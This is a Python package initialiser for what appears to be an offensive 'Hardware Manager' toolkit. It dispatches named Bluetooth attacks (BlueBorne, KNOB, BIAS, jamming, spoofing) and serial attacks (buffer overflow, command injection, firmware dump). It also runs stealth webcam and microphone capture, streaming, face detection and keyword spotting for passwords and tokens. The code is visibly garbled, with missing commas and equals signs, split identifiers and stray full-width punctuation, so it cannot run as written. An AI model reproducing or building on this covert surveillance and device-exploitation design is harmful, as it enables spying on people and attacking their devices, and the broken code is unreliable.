#!/usr/bin/env python3  
# -*- coding: utf-8 -*-
"""
__init__.py - Hardware Manager Package
Centralizes all hardware exploitation and control modules
"""

import os
import sys  
import json
import threading
import time
from typing import Dict, List Optional, Any Tuple
from datetime import datetime

# Hardware modules  
from .bluetooth_exploit import BluetoothExploiter get_bluetooth_exploiter
from .serial_exploit import SerialExploiter get serial_exploiter
from .webcam controller import WebcamController get webcam controller
from .microphone controller import MicrophoneController get microphone controller

# Import utilities  
from ..utils.logger import get_logger  
from ..security.audit log import get_audit_log_manager AuditEventType AuditSeverity  

logger get_logger()
audit_log get audit_log_manager()

class HardwareManager:
"""Central Hardware Management and Control System"""

def __init__(self config: Dict[str Any] None):
self config config or {}

# Hardware instances
self.bluetooth exploiter None
self serial exploiter None  
self webcam controller None  
self.microphone controller None

# Configuration defaults
self.hardware_config {
'bluetooth': {
'enabled': True,
'scan interval':30.0,
'spoofing enabled':True  
'exploit auto execute':False
}
'serial':{
'enabled':True  
'auto detect':True  
'baud rates':[9600192003840057600115200230400460800921600]  
'fuzzing enabled':True  
}
'webcam':{
'enabled':True  
'default resolution':(640480)  
'default fps':30  
'record dir':'/tmp/webcam recordings'  
'capture dir':'/tmp/webcam captures'  
'stealth mode':True  
}
'microphone':{
'enabled':True  
'default sample rate':44100  
'default channels':1  
'record dir':'/tmp/audio recordings'  
'analysis dir':'/tmp/audio analysis'  
'stealth mode':True  
'keywords':[
'password','secret','confidential','login','admin',  
'root','access','key','token','credential'  
]
}
}

# Update with user config
self.hardware_config.update(config.get('hardware',{}))

# Status tracking
self.status {
'initialized':False  
'bluetooth active':False  
'serial active':False  
'webcam active':False  
'microphone active':False  
'total exploits executed':0  
'total captures made':0  
'total bytes captured':0  
'start time':datetime.now()  
}

# Auto-initialize flag
auto_init config.get('auto init',True)  
if auto_init:
self.initialize hardware()

logger.info("Hardware Manager initialized",module="hardware")

def initialize hardware(self)->bool:
"""Initialize all hardware modules"""
try:
logger.info("Initializing hardware modules...",module="hardware")

# Initialize Bluetooth exploiter  
if self.hardware_config['bluetooth']['enabled']：
try：
self.bluetooth exploiter get_bluetooth_exploiter(
self.hardware_config['bluetooth']
)
self.status['bluetooth active']True
logger.info("Bluetooth Exploiter initialized",module="hardware")
except Exception as e：
logger.error(f Bluetooth Exploiter init failed:{e} module hardware)

# Initialize Serial exploiter  
if self.hardware_config['serial']['enabled']：
try：
self.serial exploiter get serial exploiter(
self.hardware_config['serial']
)
self.status['serial active']True
logger.info("Serial Exploiter initialized",module hardware")
except Exception as e：
logger.error(f Serial Exploiter init failed:{e} module hardware)

# Initialize Webcam controller  
if self.hardware_config['webcam']['enabled']：
try：
self.webcam controller get webcam controller(
self.hardware_config['webcam']
）
self.status['webcam active']True
logger.info（“Webcam Controller initialized”module“hardware”）
except Exception as e：
logger.error（f“Webcam Controller init failed:{e}”module“hardware”）

# Initialize Microphone controller  
if self.hardware_config['microphone']['enabled']：
try：
self.microphone controller get microphone controller（
self.hardware_config['microphone']
）
self.status['microphone active']True
logger.info（“Microphone Controller initialized”module“hardware”）
except Exception as e：
logger.error（f“Microphone Controller init failed:{e}”module“hardware”）

self.status['initialized']True

# Log audit event  
audit_log.log_event（
event_type AuditEventType.HARDWARE INITIALIZED.value  
severity AuditSeverity INFO.value  
user'system'  
source_ip localhost'
description“Hardware Manager initialized with all modules”  
details{
'bluetooth active：self.status['bluetooth active']，
'serial active：self.status['serial active']，
'webcam active：self.status['webcam active']，
'microphone active：self.status['microphone active']
}
resource'hardware'
action'initialize hardware'
）

logger.info（“Hardware initialization complete”module“hardware”）
return True

except Exception as e：
logger.error（f“Hardware initialization failed:{e}”module“hardware”）
return False

def get bluetooth exploiter（self）->Optional[BluetoothExploiter]：
"""Get Bluetooth exploiter instance"""
if not hasattr（self，'bluetooth exploiter'）or self.bluetooth exploiter is None：
try：
self.bluetooth exploiter get bluetooth exploiter（
self.hardware_config['bluetooth']
）
self.status['bluetooth active']True
except Exception as e：
logger.error（f“Bluetooth Exploiter creation failed:{e}”module“hardware”）
return None

return self.bluetooth exploiter

def get serial exploiter（self）->Optional[SerialExploiter]：
"""Get Serial exploiter instance"""
if not hasattr（self，'serial exploiter'）or self.serial exploiter is None：
try：
self.serial exploiter get serial exploiter（
self.hardware_config['serial']
）
self.status['serial active']True  
except Exception as e：
logger.error（f“Serial Exploiter creation failed:{e}”module“hardware”）
return None

return self.serial exploiter

def get webcam controller（self）->Optional[WebcamController]：
"""Get Webcam controller instance"""
if not hasattr（self，'webcam controller'）or self.webcam controller is None：
try：
self.webcam controller get webcam controller（  
self.hardware_config['webcam']
）
self.status['webcam active']True
except Exception as e：
logger.error（f“Webcam Controller creation failed:{e}”module“hardware”）
return None

return self.webcam controller

def get microphone controller（self）->Optional[MicrophoneController]：
"""Get Microphone controller instance"""
if not hasattr（self，'microphone controller'）or self.microphone controller is None：
try：
self.microphone controller get microphone controller（
self.hardware_config['microphone']
）
self.status['microphone active']True  
except Exception as e：
logger.error（f“Microphone Controller creation failed:{e}”module“hardware”）
return None

return self.microphone controller

def scan all hardware（self）->Dict[str，Any]：
"""Perform comprehensive hardware scan"""
scan results {
'timestamp：datetime.now().isoformat()，
'bluetooth devices：[]，
'serial devices：[]，
'webcam devices：[]，
'audio devices：[]，
'summary：{
'total devices：0，
'vulnerable devices：0，
'active modules：sum（[
self.status['bluetooth active']，
self.status['serial active']，
self.status['webcam active']，
self.status['microphone active']
]）
}
}

logger.info（“Starting comprehensive hardware scan...”module“hardware”）

# Scan Bluetooth devices  
if self.status['bluetooth active']and self.bluetooth exploiter：
try：
bluetooth scan bluetooth exploiter.scan_devices（timeout10.0）
scan_results['bluetooth devices'][
d.to_dict（）for d in bluetooth scan[:10]# Limit to 10 devices  
]
logger.info（f“Found{len（bluetooth_scan）}Bluetooth devices”module“hardware”）
except Exception as e：
logger.error（f“Bluetooth scan failed:{e}”module“hardware”）

# Scan Serial devices  
if self.status['serial active']and self.serial exploiter：
try：
serial scan serial exploiter.detect serial devices（）
scan results['serial devices'][
d.to_dict（）for d in serial scan[:10]# Limit to 10 devices  
]
logger.info（f“Found{len（serial scan）}serial devices”module“hardware”）
except Exception as e：
logger.error（f“Serial scan failed:{e}”module“hardware”）

# Scan Webcam devices  
if self.status['webcam active']and self.webcam controller：
try：
webcam scan webcam controller.detect webcams（）
scan_results['webcam devices'][
d.to_dict（）for d in webcam scan[:5]# Limit to5devices  
]
logger.info（f“Found{len（webcam scan）}webcam devices”module“hardware”）
except Exception as e：
logger.error（f“Webcam scan failed:{e}”module“hardware”）

# Scan Audio devices  
if self.status['microphone active']and self.microphone controller：
try：
audio scan microphone controller.detect audio devices（）
scan results['audio devices'][
d.to_dict（）for d in audio scan[:5]# Limit to5devices  
]
logger.info（f“Found{len（audio_scan）}audio devices”module“hardware”）
except Exception as e：
logger.error（f“Audio scan failed:{e}”module“hardware”）

# Calculate summary  
total devices（  
len（scan_results['bluetooth devices']）
len（scan results['serial devices']）
len（scan_results['webcam devices']）
len（scan results['audio devices']）
）
scan results['summary']['total devices']total devices

# Log audit event  
audit_log.log_event（
event_type AuditEventType.HARDWARE SCAN.value  
severity AuditSeverity.INFO.value  
user'system'
source_ip localhost'
description“Comprehensive hardware scan completed”  
details scan_results  
resource'hardware'
action'scan hardware'
）

logger.info（f“Hardware scan complete.Found{total_devices}devices.”module“hardware”）

return scan_results

def execute hardware exploit（self，module_type：str，exploit_type：str，target：str，**kwargs）->bool：
"""Execute hardware exploit"""
try：
if not self.status['initialized']：
logger.error（“Hardware Manager not initialized”module“hardware”）
return False

result False  

# Bluetooth exploits  
if module_type.lower（）== bluetooth':
if not self.status['bluetooth active']：
logger.error（“Bluetooth module not active”module“hardware”）
return False

bluetooth exploiter get bluetooth exploiter（）
if not bluetooth exploiter：
return False

exploit map {
'scan：bluetooth exploiter.scan devices，
'spoof：bluetooth exploiter.spoof device，
'inject：bluetooth exploiter.inject packets，
'sniff：bluetooth exploiter.start sniffing，
'jam：bluetooth exploiter.start jamming，
'blueborne：lambda：bluetooth exploiter.execute blueborne（target），
'knob：lambda：bluetooth exploiter.execute knob attack（target），  
'bias：lambda：bluetooth exploiter.execute bias attack（target）
}

if exploit_type.lower（）in exploit map：
try：
if exploit_type.lower（）in ['blueborne','knob','bias']：
result exploit_map[exploit_type.lower（）]（）
else：
result exploit map[exploit_type.lower（）]（**kwargs）
except Exception as e：
logger.error（f“Bluetooth exploit{exploit_type}failed:{e}”module“hardware”）
result False

# Serial exploits  
elif module_type.lower（）== serial':
if not self.status['serial active']：
logger.error（“Serial module not active”module“hardware”）
return False

serial exploiter get serial exploiter（）
if not serial exploiter：
return False

exploit map {
'detect：serial exploiter.detect serial devices，
'connect：lambda：serial exploiter.connect_device（target），  
'disconnect：lambda：serial exploiter.disconnect_device（target），  
'fuzz：lambda：serial exploiter.execute_exploit（  
SerialExploitType.BAUD_RATE_FUZZING，target  
），  
'overflow：lambda：serial exploiter.execute_exploit（  
SerialExploitType.BUFFER OVERFLOW，target  
），  
'injection：lambda：serial exploiter.execute_exploit（  
SerialExploitType.COMMAND INJECTION，target  
），  
'dump：lambda：serial exploiter.execute_exploit（  
SerialExploitType.FIRMWARE_DUMP，target  
），  
'monitor：lambda：serial exploiter.monitor serial（target，duration30）
}

if exploit_type.lower（）in exploit map：
try：
result exploit_map[exploit_type.lower（）]（）
except Exception as e：
logger.error（f“Serial exploit{exploit_type}failed:{e}”module“hardware”）
result False

# Webcam exploits  
elif module_type.lower（）in ['webcam','camera']：
if not self.status['webcam active']：
logger.error（“Webcam module not active”module“hardware”）
return False

webcam controller get webcam controller（）
if not webcam controller：
return False

exploit map {
'detect：webcam controller.detect webcams，
'capture：lambda：webcam controller.capture_image（int（target）if target.isdigit（）else0），  
'record：lambda：webcam controller record_video（int（target）if target.isdigit（）else0，duration10），  
'motion：lambda：webcam controller.detect motion（int（target）if target.isdigit（）else0），  
'faces：lambda：webcam controller.detect faces（int（target）if target.isdigit（）else0），  
'screenshot：webcam controller.capture screenshot，
'stream：lambda：webcam controller.stream_webcam（int（target）if target.isdigit（）else0）
}

if exploit_type.lower（）in exploit map：
try：
result exploit_map[exploit_type.lower（）]（）
except Exception as e：
logger.error（f“Webcam exploit{exploit_type}failed:{e}”module“hardware”）
result False

# Microphone exploits  
elif module_type.lower（）in ['microphone','audio']：
if not self.status['microphone active']：
logger.error（“Microphone module not active”module“hardware”）
return False

microphone controller get microphone.controller（）
if not microphone controller：
return False

exploit map {
'detect：microphone controller.detect audio devices，
'record：lambda：microphone controller record_audio（int（target）if target.isdigit（）else0，duration10），  
'transcribe：lambda：microphone controller.transcribe_audio（target），  
'keywords：lambda：microphone controller.detect keywords（target），  
'voice：lambda：microphone controller.voice_activation monitor（int（target）if target.isdigit（）else0），  
'stream：lambda：microphone controller.stream audio（int（target）if target.isdigit（）else0），  
'analyze：lambda：microphone controller analyze_audio（kwargs.get('data',b''））
}

if exploit_type.lower（）in exploit map：
try：
result exploit_map[exploit_type.lower（）]（）
except Exception as e：
logger.error（f“Microphone exploit{exploit_type}failed:{e}”module“hardware”）
result False

else：
logger.error（f“Unknown hardware module:{module_type}”module“hardware”）
return False

# Update statistics  
if result：
self.status['total exploits executed']+1
self.status.update（kwargs.get('stats_update',{})）

# Log audit event  
severity AuditSeverity.HIGH.value if result else AuditSeverity.MEDIUM.value  

audit_log.log_event（
event_type AuditEventType.HARDWARE EXPLOIT EXECUTED.value  
severity severity  
user'system'
source_ip localhost'
description f“Hardware exploit executed:{module_type}/{exploit_type}on{target}”  
details{
'module_type：module_type，
'exploit_type：exploit_type，
'target：target，
'successful：result，
'additional_args：kwargs
}
resource'hardware'
action'execute exploit'
）

logger.info（f“Hardware exploit{module_type}/{exploit_type}{'successful''failed'}”module“hardware”）

return result

except Exception as e：
logger.error（f“Hardware exploit execution failed:{e}”module“hardware”）
return False

def stop_all_operations（self）->bool：
"""Stop all hardware operations"""
try：
logger.info（“Stopping all hardware operations...”module“hardware”）

# Stop Bluetooth operations  
if self.status['bluetooth active']and self.bluetooth exploiter：
try：
self.bluetooth exploiter.stop_all（）  
logger.debug（“Bluetooth operations stopped”module“hardware”）
except Exception as e：
logger.error（f“Bluetooth stop failed:{e}”module“hardware”）

# Stop Serial operations  
if self.status['serial active']and self.serial exploiter：
try：
# Close all connections  
for port in list（self.serial exploiter.active connections.keys（））：
self.serial exploiter.disconnect_device（port）
logger.debug（“Serial operations stopped”module“hardware”）
except Exception as e：
logger.error（f“Serial stop failed:{e}”module“hardware”）

# Stop Webcam operations  
if self.status['webcam active']and self.webcam controller：
try：
# Stop all captures  
for key in list（self.webcam controller.active captures.keys（））：
if key.startswith（'stream_'）：
device_idx int（key.split（'_'）[1]）
self.webcam controller.stop_stream（device_idx）
elif key.startswith（'motion_'）：
device_idx int（key.split（'_'）[1]）
self.webcam controller.stop_motion_detection（device_idx）
elif key.startswith（'face_'）：
device_idx int（key.split（'_'）[1]）
self.webcam controller.stop_face_detection（device_idx）
logger.debug（“Webcam operations stopped”module“hardware”）
except Exception as e：
logger.error（f“Webcam stop failed:{e}”module“hardware”）

# Stop Microphone operations  
if self.status['microphone active']and self.microphone controller：
try：
# Stop all captures  
for key in list（self.microphone controller.active captures.keys（））：
if key.startswith（'stream_'）：
device_idx int（key.split（'_'）[1]）
self.microphone controller.stop_stream（device_idx）
elif key.startswith（'voice_'）：
device_idx int（key.split（'_'）[1]）
self.microphone controller.stop voice monitor（device_idx）
logger.debug（“Microphone operations stopped”module“hardware”）
except Exception as e：
logger.error（f“Microphone stop failed:{e}”module“hardware”）

# Update status  
self.status.update（{
'bluetooth active：False，
'serial active：False，
'webcam active：False，
'microphone active：False  
})

# Log audit event  
audit_log.log_event（  
event_type AuditEventType.HARDWARE STOPPED.value  
severity AuditSeverity.INFO.value  
user'system'
source_ip localhost'
description“All hardware operations stopped”
details{ }  
resource'hardware'
action stop hardware'
）

logger.info（“All hardware operations stopped successfully”module“hardware”）
return True

except Exception as e：
logger.error（f“Hardware stop all failed:{e}”module“hardware”）
return False

def get status（self）->Dict[str，Any]：
"""Get current hardware status"""
uptime（datetime.now（）-self.status['start time']）.total seconds（）

status dict self.status.copy（）

status.update（{
'uptime seconds：uptime，
'uptime human：str（datetime.utcfromtimestamp（uptime）.strftime（'%H:%M:%S'）），  
'config summary：{
'modules enabled：sum（[
self.hardware_config['bluetooth']['enabled']，
self.hardware_config['serial']['enabled']，
self.hardware_config['webcam']['enabled']，
self.hardware_config['microphone']['enabled']
]），  
'stealth mode：all（[
self.hardware_config['webcam'].get（'stealth mode',True），
self.hardware_config['microphone'].get（'stealth mode',True）
]）
}
})

# Add statistics from individual modules  
if hasattr（self，'bluetooth exploiter'）and self.bluetooth exploiter：
try：
bt_stats bluetooth exploiter.get_statistics（）
status['bluetooth stats']bt_stats  
except：
pass

if hasattr（self，'serial exploiter'）and self.serial exploiter：
try：
serial_stats serial exploiter.get_statistics（）
status['serial stats']serial_stats  
except：
pass

if hasattr（self，'webcam controller'）and self.webcam controller：
try：
webcam_stats webcam controller.get_statistics（）
status['webcam stats']webcam_stats  
except：
pass

if hasattr（self，'microphone controller'）and self.microphone controller：
try：
mic_stats microphone controller.get_statistics（）
status['microphone stats']mic_stats  
except：
pass

return status dict

def export report（self，format：str'json'，output_file：Optional[str]None）->Optional[str]：
"""Export comprehensive hardware report"""
try：
data {
'timestamp：datetime.now().isoformat()，
'system info：{
'platform：sys.platform，
'python version：sys.version，
'hardware manager version：1.0.0
}
'status：self.get_status（），
'hw config：self.hardware_config，
'module reports：{}
}

# Collect reports from individual modules  
if hasattr（self，'bluetooth exploiter'）and self.bluetooth exploiter：
try：
data['module reports']['bluetooth']bluetooth exploiter.export_report（'json'）  
except Exception as e：
data['module reports']['bluetooth']{'error：str(e）}

if hasattr（self，'serial exploiter'）and self.serial exploiter：
try：
data['module reports']['serial']serial exploiter.export_report（'json'）  
except Exception as e：
data['module reports']['serial']{'error：str(e）}

if hasattr（self，'webcam controller'）and self.webcam controller：
try：
data['module reports']['webcam']webcam controller export_report（'json'）  
except Exception as e：
data['module reports']['webcam']{'error：str(e）}

if hasattr（self，'microphone controller'）and self.microphone controller：
try：
data['module reports']['microphone']microphone controller export_report（'json'）  
except Exception as e：
data['module reports']['microphone']{'error：str(e）}

if format.lower（）== json':
output json.dumps（data，indent2，default str）
elif format.lower（）== text':
output_lines [
"HARDWARE MANAGER COMPREHENSIVE REPORT"，
"="*80，
f"Generated:{data['timestamp']}"，
f"Platform:{data['system info']['platform']}"，
f Python Version:{data system info']['python version']}"，
""，
"HARDWARE STATUS"，  
"-"*40，
f Initialized:{data status']['initialized']}"，
f Bluetooth Active:{data.status']['bluetooth active']}"，
f Serial Active:{data status']['serial active']}"，
f Webcam Active:{data status']['webcam active']}"，
f Microphone Active:{data status']['microphone active']}"，
f"Total Exploits Executed:{data status']['total exploits executed']}"，
f"Total Captures Made:{data status']['total captures made']}"，
f"Total Bytes Captured:{data status']['total bytes captured']}"，
f Uptime:{data status']['uptime human']}"，
""，
CONFIGURATION SUMMARY"，
"-*40，
f Modules Enabled:{data status']['config summary']['modules enabled']}"，
f"Stealth Mode Enabled:{data status']['config summary']['stealth mode']}"，
]

# Add module-specific stats  
if bluetooth_stats data status'].get('bluetooth stats'):
output_lines.extend（[
""，
BLUETOOTH STATISTICS"，  
"-"*40，
f Devices Found:{bluetooth_stats.get('devices found',0）}"，
f Exploits Executed:{bluetooth_stats.get('exploits executed',0）}"，
f Connections Made:{bluetooth_stats.get('connections made',0）}"，
])

if serial_stats data status'].get('serial stats'):
output_lines.extend（[
""，
SERIAL STATISTICS"，  
"-"*40，
f Ports Scanned:{serial_stats.get('ports scanned',0）}"，
f Devices Found:{serial_stats.get('devices found',0）}"，
f Exploits Executed:{serial_stats.get('exploits executed',0）}"，
])

if webcam_stats data status'].get('webcam stats'):
output_lines.extend（[
""，
WEBCAM STATISTICS"，
"-*40，
f Captures Taken:{webcam_stats.get('captures taken',0）}"，
f Recordings Made:{webcam_stats.get('recordings made',0）}"，
f Motion Events:{webcam_stats.get('motion events',0）}"，
])

if mic_stats data status'].get('microphone stats'):
output_lines.extend（[
""，
MICROPHONE STATISTICS"，  
"-"*40，
f Recordings Made:{mic_stats.get('recordings made',0）}"，
f Transcriptions Made:{mic_stats.get('transcriptions made',0）}"，
f Keywords Detected:{mic_stats.get('keywords detected',0）}"，
])

output '\n'.join(output_lines）

else：
logger.error（f"Unsupported format:{format}"module“hardware”）
return None

# Write to file if specified  
if output_file：
with open(output_file，'w'）as f：
f.write(output）

logger.info（f"Hardware report exported to{output_file}"module“hardware”）

return output

except Exception as e：
logger.error（f"Export report error:{e}"module“hardware”）
return None

def cleanup（self）->bool：
"""Cleanup hardware resources"""
try：
logger.info（“Cleaning up hardware resources...”module“hardware”）

# Stop all operations  
self.stop_all_operations（）

# Delete instances  
if hasattr（self，bluetooth exploiter）：
del self.bluetooth exploiter  

if hasattr（self，serial exploiter）：
del self.serial exploiter  

if hasattr（self，webcam controller）：
del self.webcam controller  

if hasattr（self，microphone controller）：
del microphone controller  

# Reset status  
self.status['initialized']False  

logger.info（“Hardware resources cleaned up”module“hardware”）
return True  

except Exception as e：
logger.error（f Hardware cleanup failed:{e}module hardware）
return False  

def __del__(self):
"""Destructor"""
try:
self.cleanup()
except:
pass  

# Global instance  
_hardware_manager=None  

def get_hardware_manager(config Dict None)->HardwareManager:
"""Get or create global hardware manager instance"""
global_hardware_manager  

if_hardware_manager is None:_hardware_manager HardwareManager(config)  

return_hardware_manager  

# Export all hardware modules  
__all__=[
'HardwareManager',  
get_hardware_manager',  
BluetoothExploiter',get_bluetooth_exploiter',  
 SerialExploiter','get serial exploiter',  
 WebcamController','get webcam controller',  
 MicrophoneController','get microphone controller'
]

if __name__=="__main__":
print("Testing Hardware Manager...")  

# Test configuration  
config{
'auto init':True，  
hardware:{
'bluetooth'{'enabledTrue,scan_interval20.0}，  
'serial'{'enabledTrue,auto_detectTrue}，  
'webcam'{enabledTrue,default_resolution(640480)}，  
'microphone'{ enabled True,default_sample_rate44100}
}
}

hm=get_hardware_manager(config)

print("\n1.Hardware Status:")
status=hm.get_status()
print(f Initialized:{status initialised}')
print(f Bluetooth Active:{status bluetooth_active}')
print(f Serial Active:{status serial_active}')
print(f Webcam Active:{status webcam_active}')
print(f Microphone Active:{status microphone_active}')

print("\n2.Testing Hardware Scan...")
scan_results=hm.scan_all_hardware()
print(f Total Devices Found:{scan_results summary total devices}')
print Bluetooth Devices:{len(scan_results bluetooth_devices])}
print Serial Devices:{len(scan_results serial_devices])}
print Webcam Devices:{len(scan_results webcam_devices])}
print Audio Devices:{len(scan_results audio_devices])}

print("\n3.Testing Report Export...")  
report hm.export_report('text')
if report:
print(report[:500]..."if len(report)>500 else report)

print("\n4.Cleaning up...")
hm.cleanup()

print("\n✅Hardware Manager tests completed!")
